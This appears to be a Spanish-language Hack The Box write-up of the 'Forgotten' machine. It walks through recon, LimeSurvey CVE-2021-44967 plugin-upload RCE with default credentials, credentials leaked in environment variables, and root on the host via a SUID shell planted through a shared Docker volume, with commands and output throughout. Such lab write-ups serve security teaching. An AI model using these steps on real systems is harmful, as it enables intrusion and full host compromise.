---
title: Forgotten
description: Forgotten
tags: [HTB]
---
## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.81

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62
```

```bash
nmap -p 22,80 -sCV 10.129.234.81

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.56 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.2
```

> El host es `172.17.0.2` — indicativo de que la aplicación corre dentro de un **contenedor Docker**. La IP del host real es la de HTB.
> 

### Enumeración web

```bash
ffuf -u http://10.129.234.81/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt

survey    [Status: 301, Size: 315]
```

> La aplicación es **LimeSurvey** en `/survey/`. Versión identificada: `6.3.7+231127`.
> 

---

## 2. Vector de entrada — CVE-2021-44967: LimeSurvey Plugin Upload RCE

**CVE-2021-44967** permite a un usuario administrador de LimeSurvey subir un plugin ZIP malicioso que contiene una webshell PHP. Al activar el plugin, el servidor ejecuta el código PHP arbitrario en el contexto del proceso Apache.

> Las credenciales `admin:password` son las por defecto de LimeSurvey en instalaciones sin hardening.
> 

### Paso 1 — Autenticar y lanzar el exploit

```bash
git clone https://github.com/godylockz/CVE-2021-44967
cd CVE-2021-44967
```

```bash
python3 limesurvey_rce.py \
  -t http://10.129.234.81/survey/ \
  -u 'admin' \
  -p 'password'

[*] Authenticating ...
[+] Login successful!
[*] Uploading plugin ...
[*] Activating plugin ...
[*] Starting listener and sending reverse shell ...
listening on [any] 4444 ...
```

---

## 3. Acceso inicial — Shell en el contenedor Docker

```bash
connect to [10.10.14.X] from (UNKNOWN) [10.129.234.81]
$ id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
```

> El usuario `limesvc` pertenece al grupo `sudo`. Además, las variables de entorno exponen las credenciales:
> 

```bash
env | grep -i lime

LIMESURVEY_ADMIN=limesvc
LIMESURVEY_PASS=5W5HN4K4GCXf9E

limesvc : 5W5HN4K4GCXf9E
```

### Acceso SSH al contenedor (shell estable)

```bash
ssh limesvc@10.129.234.81
```

---

## 4. Escalada de privilegios — Sudo ALL + SUID Dropper vía volumen Docker

### Paso 1 — Verificar sudo

```bash
sudo -l

[sudo] password for limesvc: 5W5HN4K4GCXf9E

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

> `(ALL : ALL) ALL` significa sudo sin restricciones — root inmediato dentro del contenedor.
> 

```bash
sudo -S su
id

uid=0(root) gid=0(root) groups=0(root)
```

### Paso 2 — Identificar el volumen compartido con el host

> El hostname del contenedor es `efaa6f5097ed`. El directorio `/var/www/html/survey` está montado desde el host en `/opt/limesurvey` (visible al hacer SSH al host). Cualquier archivo creado en el contenedor bajo `/var/www/html/survey/` aparece en el host.
> 

```bash
# Dentro del contenedor como root
cd /var/www/html/survey
mkdir test-from-docker
cp /bin/sh open
chmod u+s open
```

### Paso 3 — Ejecutar el binario SUID desde el host

```bash
# En el host (limesvc@forgotten)
cd /opt/limesurvey
./open -p

# id
uid=2000(limesvc) gid=2000(limesvc) euid=0(root) groups=2000(limesvc)
# whoami
root
```

> `-p` evita que el shell moderno descarte el EUID elevado cuando UID real ≠ EUID efectivo.
> 

```bash
cat /root/root.txt
[user flag]
```

---

---

## 6. Lecciones aprendidas

- **Las credenciales por defecto de aplicaciones web son el primer vector a probar.** `admin:password` en LimeSurvey funcionó sin intentos de fuerza bruta — siempre probar defaults antes de cualquier otra cosa.
- **Las variables de entorno en contenedores Docker filtran secretos frecuentemente.** `LIMESURVEY_PASS` estaba en el entorno del proceso Apache. Siempre ejecutar `env` tras obtener shell en un contenedor.
- **Volúmenes Docker compartidos entre contenedor y host = escalada lateral directa.** Si el contenedor tiene root y puede escribir en un volumen montado en el host, se puede depositar un binario SUID accesible desde el host. El host ejecuta el SUID con euid=0 sin necesitar sudo ni privesc adicional.
- **`sudo (ALL:ALL) ALL` dentro de un contenedor sigue siendo útil.** Aunque parezca que "ya estás en un contenedor", tener root en el contenedor con un volumen montado en el host equivale a comprometer el host.
- **En máquinas similares buscar:** aplicaciones web con credenciales por defecto, contenedores Docker con `sudo ALL` y volúmenes montados hacia el host, variables de entorno con contraseñas (`env`, `/proc/1/environ`), directorios compartidos entre contenedor y sistema host.

